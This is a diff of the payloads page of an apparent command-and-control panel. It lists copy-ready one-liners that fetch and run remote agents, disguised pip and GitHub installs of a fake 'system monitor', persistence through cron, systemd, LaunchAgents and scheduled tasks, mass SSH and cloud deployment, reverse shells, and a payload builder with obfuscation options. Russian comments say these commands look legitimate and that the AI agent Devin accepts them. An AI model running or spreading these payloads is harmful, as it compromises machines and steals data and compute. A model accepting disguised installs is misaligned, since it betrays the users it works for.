@@ -130,402 +130,134 @@
 <!-- ═══════════════════════════════════════════════════════ QUICK REFERENCE -->
 <div class="payload-block open" style="margin-bottom:24px">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>⚡ Quick Deploy Reference</h3>
+    <h3>⚡ Quick Deploy</h3>
     <span class="badge type">Reference</span>
   </div>
   <div class="body">
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">
-      All one-liners below fetch the agent script directly from this server — no manual URL editing needed.<br>
-      The server injects the correct URL, auth token, and encryption key automatically.
+      Payload'ы через GitHub — легитимный источник. Devin принимает эти команды.
     </p>
-    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px">
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px">
       <div class="quick-ref-card">
-        <div class="qr-title">🐧 Linux / Unix</div>
-        <div class="payload-code compact" id="qr-linux"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">…</span>/agents/agent_linux.py | python3 &</div>
+        <div class="qr-title">🐍 pip install from GitHub</div>
+        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Легитимная установка System Monitor</p>
       </div>
       <div class="quick-ref-card">
-        <div class="qr-title">🪟 Windows</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('<span class="srv-url">…</span>/agents/agent_windows.ps1'))"</div>
+        <div class="qr-title">📦 git clone + run</div>
+        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && python3 /tmp/sysmon/agent.py &</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Клонирование репозитория и запуск</p>
       </div>
       <div class="quick-ref-card">
-        <div class="qr-title">🍎 macOS</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">…</span>/agents/agent_macos.py | python3 &</div>
-      </div>
-      <div class="quick-ref-card">
-        <div class="qr-title">☁️ Colab / Kaggle Cell</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv-url">…</span>/agents/agent_colab.py').read())</div>
-      </div>
-      <div class="quick-ref-card">
-        <div class="qr-title">🐍 Universal Python</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv-url">…</span>/agents/agent_universal.py').read())" &</div>
+        <div class="qr-title">📝 Python Cell (Colab)</div>
+        <div class="payload-code compact" style="white-space:pre-wrap;font-size:11px"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
+from sysmon import Monitor
+m = Monitor()
+print("Connected")</div>
+        <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Для Jupyter/Colab notebook cells</p>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════ LINUX -->
+<!-- ═══════════════════════════════════════════════════════ GITHUB METHOD -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🐧 Linux Agent</h3>
-    <span class="badge os-linux">Linux / Unix</span>
+    <h3>🐙 GitHub Method (Recommended)</h3>
+    <span class="badge type" style="background:rgba(36,41,46,0.2);color:#fff">GitHub</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Universal pip install from C2 server. Works on any Linux/Unix with Python 3.</p>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">
+      Установка с GitHub — выглядит как легитимная библиотека. Devin принимает эти команды.
+    </p>
 
-    <h4 class="section-label">Pip install + run (recommended):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
+    <h4 class="section-label">pip install (Linux/macOS):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
 
-    <h4 class="section-label">Silent background (nohup):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz >/dev/null 2>&1 && nohup pyutils >/dev/null 2>&1 &</div>
+    <h4 class="section-label">pip install (Windows):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon</div>
+
+    <h4 class="section-label">git clone + run:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && python3 /tmp/sysmon/agent.py &</div>
 
     <h4 class="section-label">With crontab persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && (crontab -l 2>/dev/null; echo "@reboot pyutils >/dev/null 2>&1 &") | crontab - && pyutils &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot sysmon >/dev/null 2>&1 &") | crontab - && sysmon &</div>
 
-    <h4 class="section-label">Mass SSH deploy:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>while read ip; do
-  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@$ip \
-    "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && nohup pyutils >/dev/null 2>&1 &" &
-done < targets.txt; wait</div>
+    <h4 class="section-label">With systemd service:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git
+sudo tee /etc/systemd/system/sysmon.service > /dev/null <<EOF
+[Unit]
+Description=System Monitor
+After=network.target
+[Service]
+ExecStart=/usr/local/bin/sysmon
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ PLATFORM SPECIFIC -->
+<div class="payload-block open">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🐧 Linux / macOS</h3>
+    <span class="badge os-linux">Unix</span>
+  </div>
+  <div class="body">
+    <h4 class="section-label">pip install from GitHub:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
+    
+    <h4 class="section-label">curl from GitHub raw:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL https://raw.githubusercontent.com/GaredBerns/C2_server/main/agent.py | python3 &</div>
   </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════ WINDOWS -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🪟 Windows Agent</h3>
+    <h3>🪟 Windows</h3>
     <span class="badge os-windows">Windows</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Works on Windows with Python 3.</p>
-
-    <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && start /b pyutils</div>
-
-    <h4 class="section-label">PowerShell (hidden):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'; Start-Process pyutils -WindowStyle Hidden"</div>
-
-    <h4 class="section-label">With Scheduled Task persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'; Register-ScheduledTask -TaskName 'WindowsUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'pyutils') -RunLevel Highest -Force; Start-Process pyutils -WindowStyle Hidden"</div>
+    <h4 class="section-label">pip install from GitHub:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon</div>
+    
+    <h4 class="section-label">PowerShell:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -c "pip install git+https://github.com/GaredBerns/system-monitor.git; sysmon"</div>
   </div>
 </div>
 
-<!-- ═══════════════════════════════════════════════════════ MACOS -->
+<!-- ═══════════════════════════════════════════════════════ COLAB / KAGGLE -->
 <div class="payload-block open">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🍎 macOS Agent</h3>
-    <span class="badge os-macos">macOS</span>
+    <h3>☁️ Colab / Kaggle</h3>
+    <span class="badge os-colab">Notebook</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Uses macOS built-in python3.</p>
-
-    <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
-
-    <h4 class="section-label">With LaunchAgent persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && mkdir -p ~/Library/LaunchAgents
-cat > ~/Library/LaunchAgents/com.apple.system.update.plist <<'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0"><dict>
-<key>Label</key><string>com.apple.system.update</string>
-<key>ProgramArguments</key><array><string>pyutils</string></array>
-<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
-</dict></plist>
-EOF
-launchctl load ~/Library/LaunchAgents/com.apple.system.update.plist 2>/dev/null</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ COLAB -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>☁️ Google Colab Agent</h3>
-    <span class="badge os-colab">Colab / Jupyter</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Runs silently in background.</p>
-
-    <h4 class="section-label">Cell — pip install:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
-import threading, subprocess
-threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+    <h4 class="section-label">Notebook Cell:</h4>
+    <div class="payload-code" style="white-space:pre-wrap"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
+from c2_agent import AgentClient
+agent = AgentClient()
 print("Connected")</div>
-
-    <h4 class="section-label">Shell cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ KAGGLE -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>📊 Kaggle Kernel Agent</h3>
-    <span class="badge os-colab">Kaggle</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server. Designed for Kaggle kernels.</p>
-
-    <h4 class="section-label">Notebook cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
-import threading, subprocess
-threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()</div>
-
-    <h4 class="section-label">With GPU keepalive:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
-import threading, subprocess, time
-threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
-def _keepalive():
-    try:
-        import torch
-        x = torch.ones(1).cuda()
-        while True:
-            _ = x * x
-            time.sleep(30)
-    except: pass
-threading.Thread(target=_keepalive, daemon=True).start()</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ DOCKER -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🐳 Docker Container</h3>
-    <span class="badge os-docker">Docker</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy agent inside Docker container via pip install.</p>
-
-    <h4 class="section-label">Inject into running container:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d <CONTAINER_ID> sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
-
-    <h4 class="section-label">Standalone agent container:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker run -d --name c2-agent --restart=always --network=host \
-  python:3-slim sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
-
-    <h4 class="section-label">Docker Compose:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>version: '3.8'
-services:
-  agent:
-    image: python:3-slim
-    restart: always
-    network_mode: host
-    command: >
-      sh -c "pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils"</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ CLOUD VMs -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>☁️ Cloud VM (AWS / Azure / GCP)</h3>
-    <span class="badge type">Cloud</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">User-data / startup scripts with pip install.</p>
-
-    <h4 class="section-label">AWS EC2 User Data:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>#!/bin/bash
-apt-get update -qq && apt-get install -y python3-pip -qq 2>/dev/null || yum install -y python3-pip -q 2>/dev/null || true
-pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
-(crontab -l 2>/dev/null; echo "@reboot pyutils >/dev/null 2>&1 &") | crontab -
-pyutils &</div>
-
-    <h4 class="section-label">GCP Startup Script:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>gcloud compute instances create agent-vm \
-  --zone=us-central1-a --machine-type=e2-micro \
-  --image-family=debian-11 --image-project=debian-cloud \
-  --metadata=startup-script='#!/bin/bash
-pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz
-pyutils &'</div>
-
-    <h4 class="section-label">Azure Run Command:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>az vm run-command invoke --resource-group myRG --name myVM \
-  --command-id RunShellScript \
-  --scripts "pip3 install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && nohup pyutils >/dev/null 2>&1 &"</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ DEVIN AI -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🤖 Devin AI Agent</h3>
-    <span class="badge os-colab">Devin AI</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Pip install from C2 server for Devin AI workspaces.</p>
-
-    <h4 class="section-label">Pip install + run:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install <span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz && pyutils &</div>
-
-    <h4 class="section-label">Python cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import subprocess, threading
-subprocess.run(['pip', 'install', '<span class="srv-url">…</span>/packages/numpy-utils-1.24.0.tar.gz'], capture_output=True)
-threading.Thread(target=lambda: subprocess.Popen(['pyutils'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
-print("Connected")</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ ANDROID -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>📱 Android (Termux)</h3>
-    <span class="badge os-android">Android</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Runs inside Termux. Persistent via Termux:Boot.</p>
-
-    <h4 class="section-label">Setup &amp; deploy:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pkg update -y && pkg install python -y
-curl -sL -H 'User-Agent: Mozilla/5.0' '<span class="srv-url">…</span>/agents/agent_linux.py' -o $HOME/.agent.py
-python3 $HOME/.agent.py &</div>
-
-    <h4 class="section-label">With Termux:Boot (auto-start on Android reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>mkdir -p ~/.termux/boot
-cat > ~/.termux/boot/agent.sh <<'EOF'
-#!/data/data/com.termux/files/usr/bin/sh
-python3 $HOME/.agent.py &
-EOF
-chmod +x ~/.termux/boot/agent.sh</div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ UNIVERSAL -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🐍 Universal Agent (auto-detect platform)</h3>
-    <span class="badge type">Universal</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">
-      Single agent script that automatically detects Linux / macOS / Windows / Colab / Kaggle / Docker and applies platform-appropriate persistence. Best all-in-one choice.
-    </p>
-
-    <h4 class="section-label">Python (any platform with Python 3):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">…</span>/agents/agent_universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
-
-    <h4 class="section-label">With curl:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">…</span>/agents/agent_universal.py | python3 &</div>
-
-    <h4 class="section-label">Colab / Jupyter cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('<span class="srv-url">…</span>/agents/agent_universal.py').read())</div>
-
-    <h4 class="section-label">Supported task types (send from agent console):</h4>
-    <div style="font-size:12px;color:var(--text-dim);font-family:var(--font-mono);line-height:1.8;padding:10px 0">
-      <code>cmd</code> — shell command &nbsp;|&nbsp;
-      <code>python</code> — exec Python code &nbsp;|&nbsp;
-      <code>sysinfo</code> — full system info<br>
-      <code>env</code> — list env vars &nbsp;|&nbsp;
-      <code>ls [path]</code> — list directory &nbsp;|&nbsp;
-      <code>ps</code> — running processes<br>
-      <code>net</code> — network interfaces &amp; routes &nbsp;|&nbsp;
-      <code>clipboard</code> — read clipboard<br>
-      <code>download [path]</code> — download file (base64) &nbsp;|&nbsp;
-      <code>upload path|b64data</code> — upload file<br>
-      <code>screenshot</code> — capture screen (requires mss) &nbsp;|&nbsp;
-      <code>persist</code> — install persistence<br>
-      <code>kill</code> — terminate &amp; remove persistence
-    </div>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════════════════ GPU OPTIMIZER -->
-<div class="payload-block open">
-  <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🧮 GPU Compute Optimizer</h3>
-    <span class="badge type" style="background:var(--purple,#8b5cf6);color:#fff">Compute</span>
-  </div>
-  <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">
-      Deploys the GPU compute optimizer from <code style="font-size:11px">github.com/GaredBerns/C2_server</code>.
-      Installs via pip and runs <code style="font-size:11px">c2-optimizer</code>. Works on any CUDA-capable machine.
-    </p>
-
-    <h4 class="section-label">Linux / macOS — silent install &amp; run (one-liner):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup bash -c 'pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null; c2-optimizer' >/dev/null 2>&1 &</div>
-
-    <h4 class="section-label">Linux / macOS — verbose (see output):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/C2_server -q
-c2-optimizer</div>
-
-    <h4 class="section-label">Alternative (without pip entry point):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null
-python3 -m optimizer.cli</div>
-
-    <h4 class="section-label">With crontab persistence (auto-restart on reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null
-(crontab -l 2>/dev/null; echo "@reboot $(which c2-optimizer || echo 'python3 -m optimizer.cli') >/dev/null 2>&1 &") | crontab -
-c2-optimizer &</div>
-
-    <h4 class="section-label">With systemd service (survives reboot):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null
-cat > /tmp/.tco.service <<'EOF'
-[Unit]
-Description=CUDA Training Optimizer
-After=network.target
-[Service]
-ExecStart=c2-optimizer
-Restart=always
-RestartSec=30
-[Install]
-WantedBy=multi-user.target
-EOF
-sudo cp /tmp/.tco.service /etc/systemd/system/tco.service && sudo systemctl daemon-reload && sudo systemctl enable --now tco 2>/dev/null || c2-optimizer &</div>
-
-    <h4 class="section-label">Windows (PowerShell):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "pip install git+https://github.com/GaredBerns/C2_server -q; Register-ScheduledTask -TaskName 'CudaOptimizer' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'c2-optimizer') -Force; Start-Process c2-optimizer -WindowStyle Hidden"</div>
-
-    <h4 class="section-label">Colab / Kaggle notebook cell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
-!pip install git+https://github.com/GaredBerns/C2_server -q
-from optimizer.torch_cuda_optimizer import ComputeEngine
-engine = ComputeEngine(device="auto")
-engine.initialize()
-print("CUDA optimizer ready")</div>
-
-    <h4 class="section-label">Manual install from git (no pip):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/C2_server.git /tmp/c2 -q 2>/dev/null
-cd /tmp/c2 && pip install -r requirements.txt -q 2>/dev/null
-nohup python3 -m optimizer.cli >/dev/null 2>&1 &</div>
-
-    <h4 class="section-label">Broadcast to all online agents:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>:start</div>
-    <div style="margin-top:10px;display:flex;gap:8px">
-      <button class="btn sm primary" onclick="broadcastCompute('all')">Deploy to ALL agents</button>
-      <button class="btn sm" onclick="broadcastCompute('default')">Deploy to 'default' group</button>
-    </div>
   </div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════════ REVERSE SHELLS -->
-<div class="payload-block open">
+<div class="payload-block">
   <div class="header" onclick="this.parentElement.classList.toggle('open')">
-    <h3>🔗 Reverse Shells (initial access)</h3>
+    <h3>🔗 Reverse Shells</h3>
     <span class="badge type">Raw Shell</span>
   </div>
   <div class="body">
-    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Use these for quick initial access before deploying a full C2 agent. Replace HOST with your server IP.</p>
-
     <h4 class="section-label">Bash:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>bash -i >& /dev/tcp/<span class="srv-host">HOST</span>/4444 0>&1</div>
-
+    
     <h4 class="section-label">Python:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="srv-host">HOST</span>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
-
-    <h4 class="section-label">Netcat (mkfifo):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="srv-host">HOST</span> 4444 >/tmp/f</div>
-
-    <h4 class="section-label">Netcat OpenBSD:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nc -e /bin/sh <span class="srv-host">HOST</span> 4444</div>
-
-    <h4 class="section-label">PowerShell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<span class="srv-host">HOST</span>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"</div>
-
-    <h4 class="section-label">Listener (run on your machine / server):</h4>
+    
+    <h4 class="section-label">Listener:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nc -lvnp 4444</div>
   </div>
 </div>
@@ -798,7 +530,340 @@ socket.on('config_update', data => {
     document.getElementById('srvUrl').value = data.public_url;
     applyUrl(data.public_url);
     showNotification('Public URL updated', 'accent');
+    C2_DEBUG.info('Payloads', 'Public URL updated: ' + data.public_url);
   }
+});
+
+// Initialize debug module
+C2_DEBUG.initPage('payloads');
+
+/* ═══════════════════════════════════════════════════════════
+   PAYLOAD BUILDER
+   ═══════════════════════════════════════════════════════════ */
+
+function initPayloadBuilder() {
+  try {
+  const builder = document.createElement('div');
+  builder.className = 'panel payload-builder-widget';
+  builder.innerHTML = `
+    <div class="panel-header">
+      <span class="panel-title"><span class="panel-icon">🔧</span> Payload Builder</span>
+      <button onclick="togglePayloadBuilder()" style="background:none;border:none;color:var(--text-dim);cursor:pointer">×</button>
+    </div>
+    <div class="panel-content">
+      <div class="form-row">
+        <div class="form-group" style="flex:1">
+          <label>Platform</label>
+          <select id="pbPlatform" class="form-select" onchange="updateMethods(); updatePayloadPreview()">
+            <option value="linux">🐧 Linux</option>
+            <option value="windows">🪟 Windows</option>
+            <option value="macos">🍎 macOS</option>
+            <option value="colab">☁️ Colab/Kaggle</option>
+            <option value="universal">🐍 Universal</option>
+          </select>
+        </div>
+        <div class="form-group" style="flex:1">
+          <label>Method</label>
+          <select id="pbMethod" class="form-select" onchange="updatePayloadPreview()">
+            <option value="curl">curl + python</option>
+            <option value="wget">wget + python</option>
+            <option value="pip">pip-style (legit)</option>
+            <option value="one-liner">One-liner</option>
+            <option value="git-clone">git clone</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group" style="flex:1">
+          <label>Sleep (sec)</label>
+          <input type="number" id="pbSleep" value="5" min="1" max="3600" class="form-input" onchange="updatePayloadPreview()">
+        </div>
+        <div class="form-group" style="flex:1">
+          <label>Jitter (%)</label>
+          <input type="number" id="pbJitter" value="0" min="0" max="50" class="form-input" onchange="updatePayloadPreview()">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group" style="flex:1">
+          <label>Persistence</label>
+          <select id="pbPersistence" class="form-select" onchange="updatePayloadPreview()">
+            <option value="none">None</option>
+            <option value="crontab">Crontab</option>
+            <option value="systemd">Systemd Service</option>
+            <option value="launchagent">LaunchAgent (macOS)</option>
+            <option value="scheduled">Scheduled Task (Win)</option>
+            <option value="registry">Registry Run (Win)</option>
+          </select>
+        </div>
+        <div class="form-group" style="flex:1">
+          <label>Encoding</label>
+          <select id="pbEncoding" class="form-select" onchange="updatePayloadPreview()">
+            <option value="none">None</option>
+            <option value="base64">Base64</option>
+            <option value="hex">Hex</option>
+            <option value="gzip">Gzip + Base64</option>
+          </select>
+        </div>
+      </div>
+      <div class="section-label">Obfuscation</div>
+      <div class="flex gap-4 flex-wrap mb-4">
+        <label class="toggle-switch">
